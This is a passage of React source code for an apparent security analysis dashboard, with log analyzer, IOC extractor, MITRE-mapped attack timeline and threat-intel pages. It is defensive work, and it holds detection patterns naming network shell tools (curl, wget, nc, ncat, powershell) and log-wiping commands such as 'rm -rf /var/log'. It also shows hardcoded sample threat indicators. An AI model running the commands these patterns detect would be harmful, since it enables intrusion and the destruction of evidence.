                  {t:"Reputation",      s:`${r.health.rep}/15`,     g:r.health.rep < 6 ? "F" : r.health.rep < 10 ? "D" : "B", desc:`VT: ${String(r.rep?.vt ?? "N/A")}, AbuseIPDB: ${String(r.rep?.abuseipdb ?? "N/A")}, URLScan: ${String(r.rep?.urlscan ?? "N/A")}.`,c:r.health.rep < 8 ? "red" : "amber"},
                  {t:"Content Integrity",s:`${r.health.content}/15`,g:r.health.content < 6 ? "F" : r.health.content < 10 ? "D" : "B", desc:`Hidden iframes: ${r.content.hidden_iframes}, obfuscated JS: ${r.content.obfuscated_js ? "yes" : "no"}.`,c:r.health.content < 8 ? "red" : "amber"},
                ].map(b => (
                  <div key={b.t} className="card" style={{ padding:"14px 16px" }}>
                    <div className="fjsb mb6"><span style={{ fontWeight:700, fontSize:12.5 }}>{b.t}</span><span className="mono" style={{ fontSize:22, fontWeight:700, color:b.c==="red"?"var(--red)":b.c==="amber"?"var(--amber)":"var(--green)" }}>{b.g}</span></div>
                    <div className="mono txt-xs txt-muted mb6">{b.s} points</div>
                    <div style={{ fontSize:11, color:"var(--t2)", lineHeight:1.65 }}>{b.desc}</div>
                  </div>
                ))}
              </div>
            </>
          )}

          {tab === "injections" && (
            <>
              <div className={hasMaliciousInjection ? "err-box mb16" : "ok-box mb16"}><strong>⚑ {r.injections.length} injection indicators detected.</strong> {hasMaliciousInjection ? "Review these findings before allowing access." : "No active malicious injection behavior was confirmed by current checks."}</div>
              {r.injections.map((inj, i) => (
                <div key={i} className={`inj-finding ${inj.sev === "warn" ? "warn" : inj.sev === "info" ? "info" : ""}`}>
                  <div className="inj-icon">{inj.icon}</div>
                  <div className="inj-body">
                    <div className="inj-title">{inj.title}</div>
                    <div className="inj-detail">{inj.detail}</div>
                  </div>
                  <Badge level={inj.sev}>{inj.sev.toUpperCase()}</Badge>
                </div>
              ))}
              <div className="warn-box mt16">
                <strong>Additional injection indicators:</strong><br />
                • Security checks flagged: {r.checks.filter(c => c.ok === false).length}<br />
                • Obfuscated scripts detected: {r.content.obfuscated_js ? "Yes" : "No"}<br />
                • External resource indicators: {(r.content.ext_scripts || []).length ? r.content.ext_scripts.join(", ") : "None from current scan"}
              </div>
            </>
          )}

          {tab === "vulns" && (
            <>
              <div className={`${r.vulns.length > 0 ? "warn-box" : "ok-box"} mb16`}><strong>{r.vulns.length} vulnerability findings detected</strong> from backend vulnerability analysis.</div>
              {r.vulns.map((v, i) => (
                <div key={i} className="vuln-row">
                  <div className="vuln-hd">
                    <div className="vuln-name">{v.name}</div>
                    <Badge level={v.sev}>{v.sev.toUpperCase()}</Badge>
                    <span className="ioc ioc-cve">{v.cve}</span>
                  </div>
                  <div className="vuln-evidence">{v.evidence}</div>
                  <div className="vuln-fix">✅ Fix: {v.fix}</div>
                </div>
              ))}
            </>
          )}

          {tab === "content" && (
            <div className="g2">
              <div className="card">
                <div className="card-hd"><span className="card-title">🔬 Page Content Analysis</span></div>
                <div className="card-body">
                  {[
                    {n:"Login Form Detected",v:r.content.login_form ? "Yes ⚠" : "No",ok:!r.content.login_form},
                    {n:"Password Field",v:r.content.pass_field ? "Yes ⚠" : "No",ok:!r.content.pass_field},
                    {n:"Form Action",v:r.content.form_action,ok:!r.content.login_form},
                    {n:"Hidden IFrames",v:r.content.hidden_iframes > 0 ? `${r.content.hidden_iframes} found ⚠` : "0 found",ok:r.content.hidden_iframes === 0},
                    {n:"Obfuscated JavaScript",v:r.content.obfuscated_js ? "Detected ⚠" : "Not detected",ok:!r.content.obfuscated_js},
                    {n:"External Scripts",v:r.content.ext_scripts.length ? `${r.content.ext_scripts.length} flagged ⚠` : "None flagged",ok:r.content.ext_scripts.length === 0},
                    {n:"CSP Header",v:r.checks.find(c => c.n === "Page Scripts")?.ok === true ? "Likely present/low risk" : "Not confirmed",ok:r.checks.find(c => c.n === "Page Scripts")?.ok === true},
                    {n:"X-Frame-Options",v:r.content.hidden_iframes === 0 ? "No iframe abuse observed" : "Risk indicators present ⚠",ok:r.content.hidden_iframes === 0},
                  ].map((c, i) => (
                    <div key={i} className="ck-row">
                      <div className="ck-ic">{c.ok === false ? "🔴" : "🟢"}</div>
                      <div className="ck-lbl">{c.n}</div>
                      <div className="ck-val" style={{ color: c.ok === false ? "var(--red)" : "var(--green)" }}>{c.v}</div>
                    </div>
                  ))}
                  <div className={`${hasContentRedFlags ? "err-box" : "ok-box"} mt12`}>{hasContentRedFlags ? <>Content risk indicators detected — review form/script behavior: <strong>{r.content.form_action}</strong></> : <>No strong content-exfiltration pattern confirmed from current page artifacts.</>}</div>
                </div>
              </div>
              <div className="card">
                <div className="card-hd"><span className="card-title">📡 External Resources</span></div>
                <div className="card-body">
                  <SecHd>External Script Indicators</SecHd>
                  {r.content.ext_scripts.map((s, i) => <div key={i} className="ioc ioc-url mb8" style={{ display:"block" }}>{s}</div>)}
                  <div className="warn-box mt12">{(r.content.ext_scripts || []).length ? "External script sources were flagged by backend analysis. Validate trust and hosting reputation." : "No suspicious external script sources were flagged in this scan."}</div>
                </div>
              </div>
            </div>
          )}

          {tab === "reputation" && (
            <>
              <div className="g2 mb16">
                {[{src:"VirusTotal",icon:"🔬",val:String(r.rep?.vt ?? "N/A"),desc:"backend provider + verdict summary",c:"red",pct:Math.min(Number(r.risk || 0), 100)},
                  {src:"PhishTank",icon:"🎣",val:String(r.rep?.phishtank ?? "N/A"),desc:"provider configuration status",c:"red",pct:Math.min(Number(r.risk || 0), 100)},
                  {src:"AbuseIPDB",icon:"📡",val:String(r.rep?.abuseipdb ?? "N/A"),desc:"backend IP reputation summary",c:"amber",pct:Math.min(Number(r.risk || 0), 100)},
                  {src:"URLScan.io",icon:"🔍",val:String(r.rep?.urlscan ?? "N/A"),desc:"backend URLScan verdict",c:"red",pct:Math.min(Number(r.risk || 0), 100)},
                ].map(rep => (
                  <div key={rep.src} className="card" style={{ padding:"16px" }}>
                    <div className="fac gap8 mb8"><span style={{fontSize:18}}>{rep.icon}</span><span style={{fontWeight:700,fontSize:13}}>{rep.src}</span></div>
                    <div className="mono" style={{ fontSize:20, fontWeight:700, color:rep.c==="red"?"var(--red)":"var(--amber)", marginBottom:4 }}>{rep.val}</div>
                    <div className="txt-sm txt-sec mb10">{rep.desc}</div>
                    <Pbar val={rep.pct} color={rep.pct > 80 ? "red" : "amber"} />
                  </div>
                ))}
              </div>
              <div className="card">
                <div className="card-hd"><span className="card-title">🌍 IP Intelligence</span></div>
                <div className="card-body">
                  <table className="tbl"><tbody>
                    <tr><td className="txt-muted" style={{width:130}}>IP Address</td><td style={{color:"var(--red)",fontWeight:600}}>{r.ip || "N/A"}</td></tr>
                    <tr><td className="txt-muted">ISP / Host</td><td style={{color:"var(--amber)"}}>{r.isp || "N/A"}</td></tr>
                    <tr><td className="txt-muted">AbuseIPDB</td><td style={{color:"var(--red)"}}>{String(r.rep?.abuseipdb ?? "N/A")}</td></tr>
                    <tr><td className="txt-muted">URLScan Verdict</td><td style={{color:"var(--t1)"}}>{String(r.rep?.urlscan ?? "N/A")}</td></tr>
                    <tr><td className="txt-muted">Threat Level</td><td style={{color:"var(--t1)"}}>{String(r.level || "N/A")}</td></tr>
                    <tr><td className="txt-muted">Recommendation</td><td style={{color:"var(--red)",fontWeight:700}}>{Number(r.risk || 0) >= 60 ? "Block and investigate immediately" : "Investigate and monitor"}</td></tr>
                  </tbody></table>
                </div>
              </div>
            </>
          )}

          {tab === "timeline" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">📅 Analysis Timeline</span></div>
              <div className="card-body">
                <div className="tl-wrap">
                  {r.url_timeline.map((ev, i) => (
                    <div key={i} className={`tl-event ${ev.sev}`}>
                      <div className="tl-time"><Badge level={ev.sev}>{ev.sev}</Badge><span>{ev.t}</span></div>
                      <div className="tl-card">
                        <div className="tl-title">{ev.e}</div>
                        <div className="tl-body">{ev.d}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {tab === "iocs" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">🔗 Extracted IOCs</span><button className="btn btn-ghost btn-sm">⬇ Export JSON</button></div>
              <div className="card-body"><IOCPanel iocs={r.iocs} /></div>
            </div>
          )}

          {tab === "ai" && <Terminal title="Website Threat Analysis — Phishing Campaign Reconstruction" content={r.ai} />}
            </>
          )}
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: LOG ANALYZER
// ═══════════════════════════════════════════════════════════════════════════════

function LogAnalyzer() {
  const { phase, cur, done, start, reset } = useScan(LOG_STEPS);
  const [text, setText] = useState("");
  const [tab, setTab] = useState("timeline");
  const [scanText, setScanText] = useState("");
  const [result, setResult] = useState(D_LOG);
  const r = result;

  const go = useCallback(() => { setScanText(text); start(); }, [start, text]);
  const resetAll = () => { reset(); setTab("timeline"); };

  useEffect(() => {
    if (phase !== "done" || !scanText?.trim()) return;
    (async () => {
      try {
        const data = await apiJson("/api/analyze-log", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ log_text: scanText }) });
        setResult(mapLogResult(data, scanText));
      } catch (e) { reportClientError("Log analysis failed", e); }
    })();
  }, [phase, scanText]);

  return (
    <div className="view">
      {phase === "idle" && (
        <>
          <div className="mb20">
            <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>📋 Log Analyzer</div>
            <div className="txt-sec txt-sm">Detect brute force · Privilege escalation · C2 beacons · Lateral movement · Exfiltration · Log tampering</div>
          </div>
          <div className="card mb16">
            <div className="card-body">
              <label className="inp-label">Paste Log Content</label>
              <textarea className="inp textarea w100 mb12" style={{ height:180, fontSize:11, lineHeight:1.7 }} placeholder="Paste auth.log, syslog, Apache access.log, Windows Event logs, firewall logs, or any raw log format…" value={text} onChange={e => setText(e.target.value)} />
              <div className="fac gap8">
                <button className="btn btn-primary" onClick={go}>🔍 Analyze Logs</button>
                <button className="btn btn-sec" onClick={() => { setText(DEMO_LOGS); setTimeout(go, 100); }}>Load Demo Logs</button>
                <button className="btn btn-ghost" onClick={() => setText("")}>Clear</button>
                <span className="mono txt-xs txt-muted" style={{ marginLeft:"auto" }}>Supports: auth.log · syslog · access.log · firewall · WinEvent</span>
              </div>
            </div>
          </div>
          <div className="feat-grid mb18">
            {[{e:"🔐",n:"Brute Force Detection",d:"Failed login storms, rate & pattern anomalies"},
              {e:"⬆",n:"Privilege Escalation",d:"sudo abuse, NOPASSWD, SUID exploitation"},
              {e:"📡",n:"C2 Beacon Patterns",d:"Periodic outbound requests, beacon timing analysis"},
              {e:"↔",n:"Lateral Movement",d:"Internal SSH, SMB, RDP anomaly detection"},
              {e:"📦",n:"Data Exfiltration",d:"Unusual outbound volume spikes, dump patterns"},
              {e:"🗑",n:"Log Tampering",d:"rm -rf /var/log, cleared Event Log detection"},
            ].map(f => <div key={f.n} className="feat-card"><div className="feat-icon">{f.e}</div><div className="feat-name">{f.n}</div><div className="feat-desc">{f.d}</div></div>)}
          </div>
        </>
      )}

      {phase === "scanning" && (
        <div className="card">
          <div className="card-hd"><span className="card-title fac gap8"><Spinner /> Analyzing logs…</span></div>
          <div className="card-body"><ScanProgress steps={LOG_STEPS} cur={cur} done={done} /></div>
        </div>
      )}

      {phase === "done" && (
        <>
          <div className="fjsb gap12 mb20">
            <div>
              <div style={{ fontSize:18, fontWeight:800, marginBottom:4 }}>Log Analysis Complete</div>
              <div className="mono txt-xs txt-muted">{r.lines.toLocaleString()} lines analyzed · {r.suspicious} suspicious events · {r.critical} critical</div>
            </div>
            <div className="fac gap8">
              <button className="btn btn-ghost" onClick={resetAll}>↩ New Analysis</button>
              <button className="btn btn-primary" onClick={async () => { const logText = scanText || text || DEMO_LOGS; if (!logText?.trim()) return; try { const blob = await apiBlob("/api/generate-log-report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ log_text: logText }) }); downloadBlob(blob, "ghosttrace_log_report.pdf"); } catch (e) { reportClientError("Log report download failed", e); } }}>⬇ Download PDF</button>
            </div>
          </div>

          <RiskDisplay score={r.risk} level={r.level}>
            <div className="txt-sec txt-sm mb6">Full attack lifecycle — Brute Force → Root Compromise → Persistence → C2 → Lateral Movement → Exfiltration → Log Wipe</div>
            <div className="mono txt-xs txt-muted">GhostTrace SIEM Engine + AI · {r.anomalies} behavioral anomalies detected</div>
          </RiskDisplay>

          <div className="g3 mb16">
            <div className="stat c-red"><div className="stat-val" style={{color:"var(--red)"}}>{r.critical}</div><div className="stat-lbl">Critical Events</div></div>
            <div className="stat c-amber"><div className="stat-val" style={{color:"var(--amber)"}}>{r.suspicious}</div><div className="stat-lbl">Suspicious Events</div></div>
            <div className="stat c-cyan"><div className="stat-val" style={{color:"var(--cyan)"}}>{r.anomalies}</div><div className="stat-lbl">Behavioral Anomalies</div></div>
          </div>

          <div className="tabs">
            {[["timeline","📅 Event Timeline"],["iocs","🔗 IOCs"],["ai","🤖 AI Attack Chain"]].map(([id, lbl]) => (
              <button key={id} className={`tab ${tab === id ? "on" : ""}`} onClick={() => setTab(id)}>{lbl}</button>
            ))}
          </div>

          {tab === "timeline" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">📅 Forensic Event Timeline — Full Attack Lifecycle</span></div>
              <div className="card-body">
                <div className="tl-wrap">
                  {r.timeline.map((ev, i) => (
                    <div key={i} className={`tl-event ${ev.sev}`}>
                      <div className="tl-time"><Badge level={ev.sev}>{ev.sev}</Badge><span className="mono">{ev.t}</span></div>
                      <div className="tl-card">
                        <div className="tl-title">{ev.e}</div>
                        <div className="tl-body">{ev.d}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {tab === "iocs" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">🔗 IOCs Extracted from Logs</span><button className="btn btn-ghost btn-sm">⬇ Export JSON</button></div>
              <div className="card-body"><IOCPanel iocs={r.iocs} /></div>
            </div>
          )}

          {tab === "ai" && <Terminal title="Log Forensics — Attack Chain Reconstruction" content={r.ai} />}
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: IOC EXTRACTOR
// ═══════════════════════════════════════════════════════════════════════════════

function IOCExtractor() {
  const [text, setText] = useState("");
  const [result, setResult] = useState(null);
  const [copied, setCopied] = useState(false);

  const extract = useCallback(src => {
    const t = src || text;
    if (!t.trim()) return;
    const ips   = [...new Set(t.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g) || [])];
    const domains = [...new Set((t.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|ru|io|co|info|biz|xyz|online|su|cc|pw)\b/gi) || []).filter(d => !d.match(/^\d/) && !ips.some(ip => d === ip)))];
    const urls  = [...new Set(t.match(/https?:\/\/[^\s"'<>\]]+/gi) || [])];
    const emails= [...new Set(t.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
    const hashes= [...new Set(t.match(/\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b/g) || [])];
    const reg_keys = [...new Set(t.match(/HK(?:LM|CU|CR|U|CC)\\[^\s"'\n]+/gi) || [])];
    const commands = [...new Set((t.match(/(?:cmd\.exe|powershell|bash|wget|curl|python|nc|ncat)\s+[^\n]{5,}/gi) || []).map(c => c.slice(0, 80)))];
    const cves  = [...new Set(t.match(/CVE-\d{4}-\d{4,7}/gi) || [])];
    setResult({ ips, domains, urls, emails, hashes, reg_keys, commands, cves });
  }, [text]);

  const total = result ? Object.values(result).reduce((a, v) => a + v.length, 0) : 0;

  const doExport = () => {
    if (!result) return;
    const blob = new Blob([JSON.stringify(result, null, 2)], { type:"application/json" });
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "ghosttrace_iocs.json"; a.click();
  };

  return (
    <div className="view">
      <div className="mb20">
        <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>🔗 IOC Extractor</div>
        <div className="txt-sec txt-sm">Extract all Indicators of Compromise from logs, reports, emails, threat intel, or raw text</div>
      </div>

      <div className="g2">
        <div>
          <div className="card mb14">
            <div className="card-hd"><span className="card-title">📝 Input Text</span></div>
            <div className="card-body">
              <textarea className="inp textarea w100 mb12" style={{ height:230, fontSize:11, lineHeight:1.7 }} placeholder="Paste log entries, incident reports, email headers, threat intel feeds, or any raw text containing IOCs…" value={text} onChange={e => setText(e.target.value)} />
              <div className="fac gap8">
                <button className="btn btn-primary" onClick={() => extract(text)} disabled={!text.trim()}>⚡ Extract IOCs</button>
                <button className="btn btn-sec" onClick={() => { setText(DEMO_IOC_TEXT); extract(DEMO_IOC_TEXT); }}>Load Demo</button>
                <button className="btn btn-ghost" onClick={() => { setText(""); setResult(null); }}>Clear</button>
              </div>
            </div>
          </div>

          <div className="card">
            <div className="card-hd"><span className="card-title">🔎 Extraction Types</span></div>
            <div className="card-body" style={{ padding:"12px 18px" }}>
              {[["🔌","IP Addresses","IPv4 — public and private"],
                ["🌐","Domains","All major TLDs (.com .ru .io etc)"],
                ["🔗","URLs","http and https endpoints"],
                ["✉","Emails","Any valid email format"],
                ["🔐","File Hashes","MD5 (32) · SHA1 (40) · SHA256 (64)"],
                ["⚙","Registry Keys","HKLM, HKCU, HKCR full paths"],
                ["💻","Shell Commands","cmd.exe, powershell, bash, curl, wget"],
                ["⚠","CVEs / CWEs","CVE-YYYY-NNNNN format"],
              ].map(([ic, n, d]) => (
                <div key={n} className="ck-row">
                  <div className="ck-ic">{ic}</div>
                  <div className="ck-lbl">{n}</div>
                  <div className="ck-val txt-muted">{d}</div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div>
          {result ? (
            <>
              <div className="fjsb mb12">
                <div className="fac gap8"><span style={{ fontSize:15, fontWeight:700 }}>Results</span><Badge level="info">{total} IOCs Found</Badge></div>
                <div className="fac gap8">
                  <button className="btn btn-ghost btn-sm" onClick={doExport}>⬇ Export JSON</button>
                  <button className="btn btn-ghost btn-sm" onClick={() => { navigator.clipboard?.writeText(JSON.stringify(result, null, 2)); setCopied(true); setTimeout(() => setCopied(false), 2000); }}>
                    {copied ? "✓ Copied" : "Copy"}
                  </button>
                </div>
              </div>
              <div className="card mb14">
                <div className="card-body"><IOCPanel iocs={result} /></div>
              </div>
              {total > 0 && (
                <div className="card">
                  <div className="card-hd"><span className="card-title">📊 IOC Summary</span></div>
                  <div className="card-body" style={{ padding:0 }}>
                    <table className="tbl">
                      <thead><tr><th>Type</th><th>Count</th><th>Status</th></tr></thead>
                      <tbody>
                        {[["IPs","ips","ioc-ip"],["Domains","domains","ioc-domain"],["URLs","urls","ioc-url"],["Emails","emails","ioc-email"],["Hashes","hashes","ioc-hash"],["Reg Keys","reg_keys","ioc-reg"],["Commands","commands","ioc-cmd"],["CVEs","cves","ioc-cve"]].map(([lbl, key, cls]) =>
                          (result[key]?.length > 0) && (
                            <tr key={key}>
                              <td>{lbl}</td>
                              <td><span className={`ioc ${cls}`}>{result[key].length}</span></td>
                              <td><Badge level="high">Found</Badge></td>
                            </tr>
                          )
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="card" style={{ minHeight:320 }}>
              <div className="empty-state">
                <div className="empty-icon">🔗</div>
                <div className="empty-title">Ready to Extract</div>
                <div className="empty-sub">Paste any text on the left and click<br />Extract IOCs — or load the demo.</div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: ATTACK TIMELINE
// ═══════════════════════════════════════════════════════════════════════════════

function AttackTimeline() {
  const [expanded, setExpanded] = useState(null);
  const chain = ATTACK_CHAIN;
  const sevColor = { critical:"var(--red)", high:"var(--amber)", medium:"var(--blue)", low:"var(--green)" };

  return (
    <div className="view">
      <div className="fjsb mb20">
        <div>
          <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>🕵 Attack Timeline & Reconstruction</div>
          <div className="txt-sec txt-sm">AI reconstructs the full kill chain — from entry point to final objective — mapped to MITRE ATT&CK</div>
        </div>
        <Badge level="purple">MITRE ATT&CK Mapped</Badge>
      </div>

      <div className="card mb16">
        <div className="card-hd">
          <span className="card-title">📌 Investigation: {chain.name}</span>
          <span className="mono txt-xs txt-muted">{chain.target}</span>
        </div>
        <div className="card-body">
          <RiskDisplay score={chain.risk} level={chain.level}>
            <div className="txt-sec txt-sm mb6">{chain.phases.length} attack phases · Full kill chain · MITRE ATT&CK aligned · 8 IOCs</div>
          </RiskDisplay>
        </div>
      </div>

      <div className="g2 mb16">
        <div className="card">
          <div className="card-hd"><span className="card-title">🔗 Attack Phases — Click to Expand</span></div>
          <div style={{ padding:0 }}>
            {chain.phases.map((p, i) => (
              <div key={i} style={{ borderBottom: i < chain.phases.length - 1 ? "1px solid var(--border)" : "none" }}>
                <div className="fac gap12" style={{ padding:"11px 16px", cursor:"pointer" }} onClick={() => setExpanded(expanded === i ? null : i)}>
                  <div style={{ width:30, height:30, borderRadius:"50%", background:`${sevColor[p.sev]}18`, border:`1.5px solid ${sevColor[p.sev]}50`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:14, flexShrink:0 }}>{p.icon}</div>
                  <div className="f1">
                    <div style={{ fontWeight:700, fontSize:12.5, color:"var(--t1)", marginBottom:2 }}>{p.phase}</div>
                    <div className="mono txt-xs txt-muted">{p.technique}</div>
                  </div>
                  <div className="fac gap6">
                    <span className="mitre">{p.tactic}</span>
                    <Badge level={p.sev}>{p.sev}</Badge>
                    <span style={{ color:"var(--t3)", fontSize:11 }}>{expanded === i ? "▲" : "▼"}</span>
                  </div>
                </div>
                {expanded === i && (
                  <div style={{ padding:"0 16px 14px 58px", animation:"fadeUp .15s ease" }}>
                    <div className="mono txt-xs" style={{ color:"var(--t2)", lineHeight:1.8 }}>{p.detail}</div>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>

        <div style={{ display:"flex", flexDirection:"column", gap:13 }}>
          <div className="card">
            <div className="card-hd"><span className="card-title">🗺 MITRE ATT&CK Matrix</span></div>
            <div className="card-body" style={{ padding:"10px 18px" }}>
              {[["Initial Access","T1566.001","Phishing Attachment"],
                ["Execution","T1059.001","PowerShell"],
                ["Persistence","T1547.001","Registry AutoRun"],
                ["Defense Evasion","T1027","Obfuscated Files"],
                ["Injection","T1055.001","Remote Thread Injection"],
                ["C2","T1071.001","HTTP Protocol"],
                ["Credential Access","T1555.003","Browser Credentials"],
                ["Lateral Movement","T1078","Valid Credentials"],
              ].map(([tactic, id, name], i) => (
                <div key={i} className="ck-row">
                  <div className="ck-lbl" style={{ fontSize:11 }}>{tactic}</div>
                  <div className="fac gap6"><span className="mitre">{id}</span><span className="mono txt-xs txt-muted">{name}</span></div>
                </div>
              ))}
            </div>
          </div>

          <div className="card">
            <div className="card-hd"><span className="card-title">🔗 IOCs from This Chain</span></div>
            <div className="card-body"><IOCPanel iocs={chain.iocs} /></div>
          </div>
        </div>
      </div>

      <div className="card">
        <div className="card-hd"><span className="card-title">📅 Kill Chain Flowchart</span></div>
        <div className="card-body" style={{ overflowX:"auto" }}>
          <div style={{ display:"flex", gap:0, minWidth: chain.phases.length * 100 }}>
            {chain.phases.map((p, i) => (
              <div key={i} style={{ flex:1, minWidth:90, position:"relative" }}>
                <div style={{ textAlign:"center", padding:"10px 4px", cursor:"pointer" }} onClick={() => setExpanded(expanded === i ? null : i)}>
                  <div style={{ width:36, height:36, borderRadius:"50%", background:`${sevColor[p.sev]}15`, border:`2px solid ${sevColor[p.sev]}`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:15, margin:"0 auto 6px" }}>{p.icon}</div>
                  <div style={{ fontSize:9.5, fontWeight:700, color:"var(--t2)", lineHeight:1.3, textAlign:"center" }}>{p.phase}</div>
                </div>
                {i < chain.phases.length - 1 && (
                  <div style={{ position:"absolute", top:27, right:-8, width:16, height:2, background:"rgba(255,255,255,.12)" }}>
                    <div style={{ position:"absolute", right:-3, top:-3, width:8, height:8, borderTop:"2px solid rgba(255,255,255,.15)", borderRight:"2px solid rgba(255,255,255,.15)", transform:"rotate(45deg)" }} />
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: THREAT INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════════

function ThreatIntel() {
  return (
    <div className="view">
      <div className="mb20">
        <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>🌍 Threat Intelligence</div>
        <div className="txt-sec txt-sm">Connected feeds · Reputation APIs · YARA engine · IOC enrichment · Top threats</div>
      </div>

      <div className="g3 mb16">
        {[{name:"VirusTotal",   e:"🔬", checks:"24,892", status:"Connected"},
          {name:"PhishTank",    e:"🎣", checks:"1,204",  status:"Connected"},
          {name:"AbuseIPDB",    e:"📡", checks:"892",    status:"Connected"},
          {name:"URLScan.io",   e:"🔍", checks:"341",    status:"Connected"},
          {name:"ThreatFox",    e:"🦊", checks:"88",     status:"Connected"},
          {name:"YARA Engine",  e:"🛡", checks:"10,204 rules", status:"Active"},
        ].map(f => (
          <div key={f.name} className="card" style={{ padding:"15px" }}>
            <div className="fjsb mb8">
              <div className="fac gap8"><span style={{fontSize:18}}>{f.e}</span><span style={{fontWeight:700,fontSize:13}}>{f.name}</span></div>
              <Badge level="clean">{f.status}</Badge>
            </div>
            <div className="mono txt-xs txt-muted mb8">{f.checks} lookups</div>
            <Pbar val={100} color="green" />
          </div>
        ))}
      </div>

      <div className="card mb16">
        <div className="card-hd">
          <span className="card-title">🔥 Live Threat Feed</span>
          <span className="fac gap6 mono txt-xs txt-muted"><span className="live-dot" />Updated 5 min ago</span>
        </div>
        <div style={{ padding:0 }}>
          <table className="tbl">
            <thead><tr><th>Indicator</th><th>Type</th><th>Malware Family</th><th>First Seen</th><th>Source</th><th>Confidence</th><th>Status</th></tr></thead>
            <tbody>
              {[["185.220.101.47","IP","Emotet C2","2024-11-28","AbuseIPDB",94,"critical"],
                ["secure-paypa1.com","Domain","PayPal Phishing","2024-11-30","PhishTank",98,"critical"],
                ["a1b2c3d4e5f6…","MD5","Emotet Dropper","2024-11-25","VirusTotal",87,"critical"],
                ["malware-cdn.ru","Domain","Malware CDN","2024-11-20","URLScan",76,"high"],
                ["45.142.212.100","IP","LockBit 3.0 C2","2024-11-18","ThreatFox",91,"critical"],
                ["update-flash.xyz","Domain","Fake Flash Updater","2024-11-15","ESET",83,"high"],
                ["hacker@evil.ru","Email","Spearphishing Actor","2024-11-14","Internal",72,"high"],
              ].map(([ioc, type, fam, date, src, conf, level], i) => (
                <tr key={i}>
                  <td><span className="hash-pill">{ioc}</span></td>
                  <td><Badge level={type === "IP" ? "info" : type === "Email" ? "clean" : "purple"}>{type}</Badge></td>
                  <td style={{ color:"var(--t1)" }}>{fam}</td>
                  <td className="mono txt-xs txt-muted">{date}</td>
                  <td className="txt-muted">{src}</td>
                  <td><div className="fac gap6"><div style={{width:50}}><Pbar val={conf} color={conf>85?"red":"amber"}/></div><span className="mono txt-xs txt-muted" style={{minWidth:28}}>{conf}%</span></div></td>
                  <td><Badge level={level}>{level.toUpperCase()}</Badge></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="g2">
        <div className="card">
          <div className="card-hd"><span className="card-title">📊 Top Threat Families This Month</span></div>
          <div className="card-body">
            {[{n:"Emotet",c:28,pb:"red",p:35},{n:"PayPal / BofA Phishing",c:22,pb:"amber",p:27},{n:"LockBit Ransomware",c:14,pb:"red",p:17},{n:"Info Stealers",c:11,pb:"blue",p:14},{n:"Crypto Miners",c:6,pb:"green",p:7}].map(r => (
              <div key={r.n} className="mb12">
                <div className="fjsb mb6 mono txt-xs"><span style={{color:r.pb==="red"?"var(--red)":r.pb==="amber"?"var(--amber)":r.pb==="blue"?"var(--blue)":"var(--green)"}}>{r.n}</span><span className="txt-muted">{r.c} samples</span></div>
                <Pbar val={r.p} color={r.pb} />
              </div>
            ))}
          </div>
        </div>
        <div className="card">
          <div className="card-hd"><span className="card-title">🌍 Attack Origin Countries</span></div>
          <div className="card-body" style={{ padding:0 }}>
            <table className="tbl">
              <thead><tr><th>Country</th><th>Attacks</th><th>Share</th></tr></thead>
              <tbody>
                {[["🇷🇺 Russia","47","32%"],["🇨🇳 China","38","26%"],["🇧🇷 Brazil","21","14%"],["🇮🇷 Iran","18","12%"],["🇺🇸 USA (Proxied)","14","9%"],["🇳🇬 Nigeria","9","6%"]].map(([c, n, p], i) => (
                  <tr key={i}><td style={{color:"var(--t1)"}}>{c}</td><td className="mono txt-xs txt-amber" style={{color:"var(--amber)"}}>{n}</td><td className="mono txt-xs txt-muted">{p}</td></tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: REPORTS
// ═══════════════════════════════════════════════════════════════════════════════

function Reports({ reportsData = null }) {
  const reps = [
    {ic:"📄",bg:"rgba(255,45,85,.1)",  name:"invoice_update_Q4.exe — Malware Analysis",  meta:"CRITICAL · PE32 Emotet Trojan · 2024-11-30 14:22", sz:"1.2 MB", level:"critical"},
    {ic:"📄",bg:"rgba(255,45,85,.1)",  name:"secure-paypa1.com — Phishing Investigation",meta:"CRITICAL · PayPal Credential Harvest · 2024-11-30 14:08",sz:"890 KB",level:"critical"},
    {ic:"📄",bg:"rgba(255,170,0,.1)",  name:"access_logs_nov.txt — Log Forensics",       meta:"HIGH · C2 + Lateral Movement · 2024-11-30 13:10",  sz:"2.1 MB",level:"high"},
